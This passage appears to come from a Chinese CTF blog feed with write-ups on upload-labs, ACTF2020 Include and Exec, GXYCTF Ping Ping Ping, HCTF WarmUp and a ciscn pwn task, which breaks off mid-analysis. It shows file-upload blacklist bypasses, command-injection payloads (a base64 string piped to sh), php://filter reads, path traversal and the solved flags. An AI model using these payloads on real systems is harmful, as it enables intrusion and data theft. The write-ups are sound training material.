+<h2 id="pass09"><a href="#pass09" class="headerlink" title="pass09"></a>pass09</h2><h3 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>区别就在于，这次的文件名用的是之前的文件名，而不是<code>time+rand+拓展名</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130154011911.png" alt="image-20201130154011911"></p>
+<blockquote>
+<p>  注：下面的%20 代指一个空格</p>
+</blockquote>
+<p>如果<code>file_name</code>后缀名是<code>.php</code>或者<code>.php.</code>或者<code>.php%20</code>都可以绕过，但是<code>.php.</code>和<code>.php%20</code>会被<code>deldot</code>和<code>trim</code>函数去掉末尾的<code>.</code>和<code>%20</code>，为了防止如此，所以可以在后面加入一个<code>%20</code>或<code>.</code>即 <code>.php.%20</code>或<code>.php%20.</code>，但是<code>.php%20.</code>会在后面的<code>trim</code>函数中被去掉末尾的空格，所以考虑<code>.php.%20</code>，为了绕过第一个<code>trim</code>函数，防止<code>.</code>被去掉，所以在<code>.php.%20</code>的后面再加上一个<code>.</code>，变成<code>.php.%20.</code></p>
+<p><code>.php.%20. --trim--&gt; .php.%20. --deldot--&gt; .php.%20 --trim --&gt; .php.</code>绕过了黑名单，并且最后的文件名为<code>.php.%20</code></p>
+<h3 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h3><p>有待测试（</p>
+<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><h3 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由一系列的删减措施，变成了<code>replace</code>替换，但是由于只是经过了一次替换，没有递归的操作，如果双写后缀名<code>.php ==&gt; .pphphp</code>，那么在程序的运行逻辑中，<code>.p(php)hp</code>括号内的<code>php</code>将被替换成空字符，变成<code>.php</code>，由此绕过</p>
+<h3 id="绕过-4"><a href="#绕过-4" class="headerlink" title="绕过"></a>绕过</h3><p>上传时把文件名更改为<code>10.pphphp</code>，经过后段代码后，变成<code>10.php</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201201192316165.png" alt="image-20201201192316165"></p>
+<p>访问<code>http://ip:port/upload/10.php?c=id</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201201192359070.png" alt="image-20201201192359070"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>upload-labs</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ACTF2020_新生赛_Include</title>
+    <url>//buu_ACTF2020Include.html</url>
+    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
+<a id="more"></a>
+
+
+
+<h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结合题目名可以猜测是一个文件包含</p>
+<p>使用<code>php伪协议</code>读一下源码</p>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p>解码之后是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php:&#x2F;&#x2F;input&quot;) || stristr($file,&quot;zip:&#x2F;&#x2F;&quot;) || stristr($file,&quot;phar:&#x2F;&#x2F;&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#39;hacker!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#39;&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>通过这个文件包含读一下<code>flag.php</code>的源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;bfb0b1cd-426b-4590-9b3d-059c3b3cec96&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到了flag</p>
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>buu</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ACTF2020_新生赛_Exec</title>
+    <url>//buu_ACTF2020Exec.html</url>
+    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
+<a id="more"></a>
+
+
+
+<p>点进靶机界面如下</p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213540334.png" alt="image-20200809213540334" style="zoom:50%;" />
+
+<p>结合题目名，猜测是命令执行</p>
+<p>输入<code>l | ls</code></p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213614575.png" alt="image-20200809213614575" style="zoom:50%;" />
+
+<p>确实是这样，一步一步查找，在根目录下找到了<code>flag</code></p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213701427.png" alt="image-20200809213701427" style="zoom:50%;" />
+
+<p>使用<code>cat</code>命令读取</p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213717018.png" alt="image-20200809213717018" style="zoom:50%;" />
+
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>buu</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GXYCTF2019_Ping Ping Ping</title>
+    <url>//buu_GXYCTF2019_Ping_Ping_Ping.html</url>
+    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
+<a id="more"></a>
+
+
+
+<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><img src="[GXYCTF2019]Ping Ping Ping/image-20200809214947203.png" alt="image-20200809214947203" style="zoom:50%;" />
+
+<p>给了一个参数是<code>ip</code>，猜测也是命令执行</p>
+<p>使用<code>?ip=l;ls</code></p>
+<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215038502.png" alt="image-20200809215038502" style="zoom:50%;" />
+
+<p>尝试<code>cat flag.php</code></p>
+<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215106353.png" alt="image-20200809215106353" style="zoom:50%;" />
+
+<p>过滤了空格</p>
+<h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>查找资料用于绕过空格</p>
+<p><a href="https://www.freebuf.com/articles/web/137923.html">CTF中绕过小技巧</a></p>
+<p>经过测试发现<code>$IFS$9</code>可以绕过</p>
+<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215218599.png" alt="image-20200809215218599" style="zoom:50%;" />
+
+<p>继续读<code>flag.php</code></p>
+<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215246648.png" alt="image-20200809215246648" style="zoom:50%;" />
+
+<p><code>flag</code>也被过滤了</p>
+<p>看一下<code>index.php</code>的代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ....</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="绕过flag"><a href="#绕过flag" class="headerlink" title="绕过flag"></a>绕过flag</h2><p>这里屏蔽了很多语法，但是没有屏蔽<code>base64</code>和<code>sh</code></p>
+<p>使用<code>base64 -d</code>可以达到相同的作用</p>
+<p><code>payload</code>如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;l;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
+
+<p>执行之后在注释里面看到<code>flag</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">&lt;pre&gt;PING l (127.0.0.1): 56 data bytes</span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;3158ae61-1e44-495d-9f83-f63a7c25fd14&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>buu</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HCTF_2018_WarmUp</title>
+    <url>//buu_HCTF2018_WarmUp.html</url>
+    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
+<a id="more"></a>
+
+
+
+<h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><p>访问之后是一个滑稽的表情，查看网页源代码提示有一个<code>source.php</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!--source.php--&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;br&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg&quot; &#x2F;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="source-php"><a href="#source-php" class="headerlink" title="source.php"></a>source.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>要想达到文件包含</p>
+<ul>
+<li>变量<code>$file</code>不为空</li>
+<li><code>$file</code>要是一个字符串</li>
+<li>能够通过<code>emmm::checkfile</code></li>
+</ul>
+<h3 id="emmm-checkfile"><a href="#emmm-checkfile" class="headerlink" title="emmm:checkfile"></a>emmm:checkfile</h3><p>想要<code>return true</code>就要满足以下条件</p>
+<ul>
+<li><code>$file</code>不为空</li>
+<li><code>$file</code>在两个<code>?</code>字符之间的部分需要在<code>whitelist</code>里面</li>
+</ul>
+<h2 id="hint-php"><a href="#hint-php" class="headerlink" title="hint.php"></a>hint.php</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>告诉了<code>flag</code>存放的位置</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>对<code>?</code>字符进行两次<code>urlencode</code>就可以绕过<code>emmm:checkfile</code>。</p>
+<p>在发送数据到服务器的时候会有一次<code>urldecode</code>，然后在<code>emmm:checkfile</code>中有第二次过滤</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%253f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>访问上述url时，服务器将第一次<code>urldecode</code>，结果如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%3f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>在执行<code>source.php</code>的过程中，第二次解码之后的数据为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>取到<code>?</code>即<code>source.php</code>通过白名单验证</p>
+<p>至于上面的好多<code>../</code>是由于不知道<code>flag</code>文件的目录，所以只能穷举父级目录<code>../</code></p>
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>buu</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ciscn初赛-nofree</title>
+    <url>//ciscn_nofree.html</url>
+    <content><![CDATA[<p>2020年国赛 初赛pwn题</p>
+<p>由于我是懒狗，现在才想起来写wp（</p>
+<a id="more"></a>
+
+
+
+<h1 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h1><h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916171504771.png" alt="image-20200916171504771"></p>
+<p>没有开<code>pie</code>和<code>pelro</code></p>
+<h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbufs();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = menu();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    edit(a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009EF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Management:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1- New &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2- Edit&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;choice&gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> get_int();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正如描述的那样，没有<code>free</code>选项</p>
+<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    result = get_int();</span><br><span class="line">    v2 = result;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= <span class="number">144</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>] = get_content(result);</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会分配一个堆块，并且把<code>size</code>写进结构体</p>
+<p>但是分配堆块的大小，不是由<code>size</code>决定，而是由<code>strlen(content)</code>决定</p>
+<p>导致了溢出</p>
+<p>并且在add的时候，没有检查堆块是否已经存在，导致无限申请</p>
